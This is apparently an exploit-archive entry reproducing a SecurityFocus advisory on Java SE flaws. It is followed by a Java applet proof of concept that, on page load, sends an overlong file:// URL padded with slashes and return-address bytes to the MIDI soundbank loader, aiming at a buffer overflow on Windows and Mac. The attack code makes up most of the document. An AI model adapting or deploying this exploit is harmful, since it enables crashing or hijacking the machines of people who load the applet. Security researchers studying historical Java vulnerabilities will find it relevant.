source: http://www.securityfocus.com/bid/36881/info

Sun has released updates to address multiple security vulnerabilities in Java SE.

Successful exploits may allow attackers to bypass certain security restrictions, run untrusted applets with elevated privileges, execute arbitrary code, and cause denial-of-service conditions. Other attacks are also possible.

These issues are addressed in the following releases:

JDK and JRE 6 Update 17
JDK and JRE 5.0 Update 22
SDK and JRE 1.4.2_24
SDK and JRE 1.3.1_27 

import java.awt.Graphics;
public class test extends java.applet.Applet {
        public static Synthesizer synth;
        Soundbank soundbank;

    	public void init() 
	{
		String fName = ""; 
		if(isWindows()){
			System.out.println("This is Windows");
			fName = repeat('/',302);
		}else if(isMac()){
			System.out.println("This is Mac");
			fName = repeat('/',1118); // OSX Snow Leopard
		}else if(isUnix()){
			System.out.println("This is Unix or Linux, no current test case");
		}else{
			System.out.println("Your OS is not supported!!");
		}
	
		CharArrayWriter pw = new CharArrayWriter(10);  
//		int retaddr[] = { 0x0d, 0x0d, 0x0d, 0x0d }; 
		int retaddr[] = { 0x41, 0x42, 0x43, 0x44, 0x30, 0x31, 0x32, 0x33, 0x0d, 0x0d, 0x0d, 0x0d }; 
		int retlen = java.lang.reflect.Array.getLength(retaddr);

		for(int x = 0; x < retlen; x++)
		{
			pw.write(retaddr[x]);
			pw.flush();
		}

	 	pw.close();
		String mal = pw.toString();  
  
  		fName = "file://" + fName + mal;
                try
		{
                        synth = MidiSystem.getSynthesizer();
                        synth.open();
                        synth.loadAllInstruments(MidiSystem.getSoundbank(new URL(fName)));
                }
                catch(Exception e)
		{
			System.out.println(e);
                }
    	}
    	public void paint(Graphics g) 
	{
		g.drawString("Hello world!", 50, 25);
    	}
	public static String repeat(char c,int i)
	{
        	String tst = "";
         	for(int j = 0; j < i; j++)
         	{
         		tst = tst+c;
         	}
        	return tst;
	}

	public static boolean isWindows(){
 
		String os = System.getProperty("os.name").toLowerCase();
		//windows
	    return (os.indexOf( "win" ) >= 0); 
 
	}
 
	public static boolean isMac(){
 
		String os = System.getProperty("os.name").toLowerCase();
		//Mac
	    return (os.indexOf( "mac" ) >= 0); 
 
	}
 
	public static boolean isUnix(){
 
		String os = System.getProperty("os.name").toLowerCase();
		//linux or unix
	    return (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0);
 
	}
}
